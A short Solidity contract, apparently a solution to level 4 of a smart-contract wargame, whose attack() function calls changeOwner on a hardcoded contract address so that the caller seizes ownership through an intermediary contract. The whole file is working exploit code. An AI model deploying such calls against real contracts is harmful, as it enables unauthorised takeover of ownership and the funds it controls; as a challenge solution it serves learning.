// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level4 {
    address addr = 0x8D3FE79266fF6b750865ba01FB0de9116EE3Dd3C;

    function attack() public {
        (bool b,) = address(addr).call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(b);
    }
}
